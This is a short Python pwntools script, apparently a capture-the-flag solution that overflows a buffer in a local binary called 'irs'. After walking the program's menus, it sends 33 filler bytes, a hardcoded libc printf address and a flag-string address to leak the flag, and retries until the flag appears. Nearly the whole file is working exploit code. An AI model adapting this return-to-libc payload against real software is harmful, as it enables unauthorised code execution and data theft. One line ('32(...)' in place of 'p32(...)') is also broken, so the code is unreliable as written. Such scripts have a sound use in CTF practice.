#!/usr/bin/env python

from pwn import *


exit = p32(0xf7e199b0)
puts = p32(0x0804afdc)
flag = p32(0x0804c03a)

other_printf = 32(0x080484d0)
printf = p32(0xf7e34590)

initial_offset = 33

win = ''
while ( "flag" not in win ):
	win = ''
	try:
		p = tubes.process.process('./irs') 

		#'''
		p.recv()
		p.sendline("1")
		p.recv()
		p.sendline("john")
		p.recv()
		p.sendline("wins")
		p.recv()
		p.sendline("1")
		p.recv()
		p.sendline("1")
		p.recv()
		p.sendline("3")
		p.recv()
		p.sendline("john")
		p.recv()
		p.sendline("wins")
		p.recv()
		p.sendline('A'*(initial_offset) + printf + "AAAA" + flag )
		win += p.recv()
		win += p.recv()
		if ( "flag" in win ):
			print win
			break
		#'''

		p.close()
	except:
		p.close()
		continue